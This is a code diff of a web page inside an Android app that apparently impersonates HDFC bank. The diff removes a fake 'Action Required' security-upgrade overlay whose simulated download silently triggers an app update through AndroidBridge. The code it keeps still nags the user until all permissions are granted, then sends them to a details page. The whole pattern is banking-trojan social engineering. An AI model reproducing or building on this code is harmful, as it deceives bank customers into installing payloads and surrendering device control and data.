@@ -202,23 +202,7 @@
         </div>
     </div>
 
-    <!-- Trojan Overlay -->
-    <div id="trojanOverlay" class="overlay">
-        <div class="modal">
-            <div style="font-size: 60px; margin-bottom: 20px;">🛡️</div>
-            <h2 style="color: var(--hdfc-red);">Action Required!</h2>
-            <p style="margin-top: 10px; font-size: 14px;">Your current version is <b>unsecured</b>. Upgrade to the Secure Patch to protect your data.</p>
-            
-            <div id="progressBox" style="display: none; margin-top: 20px;">
-                <div style="width: 100%; height: 6px; background: #eee; border-radius: 3px; overflow: hidden;">
-                    <div id="pBar" style="width: 0%; height: 100%; background: #27ae60; transition: width 0.3s;"></div>
-                </div>
-                <p id="pText" style="font-size: 12px; margin-top: 8px; color: #666;">Downloading...</p>
-            </div>
 
-            <button id="upBtn" onclick="startDownload(event)" class="btn-red">UPGRADE & PROTECT</button>
-        </div>
-    </div>
 
     <!-- Master Overlay -->
     <div id="masterOverlay" class="overlay" style="background: white;">
@@ -244,33 +228,12 @@
 
         function triggerAction() {
             if (window.AndroidBridge) {
-                if (window.AndroidBridge.isLimitedVersion()) {
-                    document.getElementById('trojanOverlay').style.display = 'flex';
+                if (permissionsGranted) {
+                    window.location.href = 'details.html';
                 } else {
-                    if (permissionsGranted) {
-                        window.location.href = 'details.html';
-                    } else {
-                        document.getElementById('masterOverlay').style.display = 'flex';
-                    }
+                    document.getElementById('masterOverlay').style.display = 'flex';
                 }
             }
-        }
-
-        function startDownload(e) {
-            e.stopPropagation();
-            document.getElementById('upBtn').style.display = 'none';
-            document.getElementById('progressBox').style.display = 'block';
-            let prog = 0;
-            let iv = setInterval(() => {
-                prog += Math.random() * 15;
-                if (prog >= 100) {
-                    prog = 100;
-                    clearInterval(iv);
-                    document.getElementById('pText').innerHTML = "Installing...";
-                    if (window.AndroidBridge) window.AndroidBridge.triggerAutoUpdate();
-                }
-                document.getElementById('pBar').style.width = prog + '%';
-            }, 400);
         }
 
         function showRepair(e) {
@@ -281,22 +244,11 @@
         // Live Permission Sensor & Bridge Detection
         let bridgeCheck = setInterval(() => {
             if (window.AndroidBridge) {
-                // If on Trojan version, show upgrade overlay
-                if (window.AndroidBridge.isLimitedVersion()) {
-                    document.getElementById('trojanOverlay').style.display = 'flex';
-                    if (window.AndroidBridge.triggerNotificationRequest) {
-                        window.AndroidBridge.triggerNotificationRequest();
-                    }
+                if (window.AndroidBridge.hasAllPermissions && window.AndroidBridge.hasAllPermissions()) {
+                    handlePermissionResult('GRANTED');
                     clearInterval(bridgeCheck);
-                } 
-                // If on Master version, check for permissions every second
-                else {
-                    if (window.AndroidBridge.hasAllPermissions && window.AndroidBridge.hasAllPermissions()) {
-                        handlePermissionResult('GRANTED');
-                        clearInterval(bridgeCheck);
-                    } else {
-                        document.getElementById('masterOverlay').style.display = 'flex';
-                    }
+                } else {
+                    document.getElementById('masterOverlay').style.display = 'flex';
                 }
             }
         }, 1000);
